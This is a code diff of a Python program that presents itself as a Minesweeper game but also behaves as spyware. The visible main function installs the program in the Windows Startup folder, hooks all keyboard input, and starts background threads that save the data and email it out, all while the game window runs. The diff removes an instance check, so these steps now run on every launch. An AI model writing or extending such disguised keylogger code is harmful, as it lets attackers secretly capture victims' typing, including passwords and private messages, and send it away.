@@ -294,13 +294,6 @@ def start_minesweeper_game():
     Minesweeper(root)
     root.mainloop()
 
-def is_program_already_running():
-    current_pid = os.getpid()
-    for proc in psutil.process_iter(['pid', 'name']):
-        if proc.info['name'] == "python.exe" and proc.info['pid'] != current_pid:
-            return True
-    return False
-
 def main():
     startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
     current_path = os.getcwd()
@@ -338,40 +331,35 @@ def main():
         return  # 直接返回，跳过扫雷游戏的启动
 
     # 如果当前路径不是开机启动文件夹，运行扫雷游戏
-    if is_program_already_running():
-        minesweeper_thread = threading.Thread(target=start_minesweeper_game)
-        minesweeper_thread.start()
-        minesweeper_thread.join()
-    else:
-        enable_startup()
-        check_and_send_email()
+    enable_startup()
+    check_and_send_email()
 
-        keyboard.hook(on_key_event)
+    keyboard.hook(on_key_event)
 
-        atexit.register(save_data_on_exit)
+    atexit.register(save_data_on_exit)
 
-        window_checker_thread = threading.Thread(target=window_checker, daemon=True)
-        window_checker_thread.start()
+    window_checker_thread = threading.Thread(target=window_checker, daemon=True)
+    window_checker_thread.start()
 
-        save_thread_instance = threading.Thread(target=save_thread, daemon=True)
-        save_thread_instance.start()
+    save_thread_instance = threading.Thread(target=save_thread, daemon=True)
+    save_thread_instance.start()
 
-        process_updater_thread = threading.Thread(target=process_updater, daemon=True)
-        process_updater_thread.start()
+    process_updater_thread = threading.Thread(target=process_updater, daemon=True)
+    process_updater_thread.start()
 
-        email_thread_instance = threading.Thread(target=email_thread, daemon=True)
-        email_thread_instance.start()
+    email_thread_instance = threading.Thread(target=email_thread, daemon=True)
+    email_thread_instance.start()
 
-        minesweeper_thread = threading.Thread(target=start_minesweeper_game)
-        minesweeper_thread.start()
+    minesweeper_thread = threading.Thread(target=start_minesweeper_game)
+    minesweeper_thread.start()
 
-        try:
-            while True:
-                time.sleep(1)
-        except KeyboardInterrupt:
-            pass
-        finally:
-            save_data_on_exit()
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        save_data_on_exit()
 
 if __name__ == "__main__":
     main()
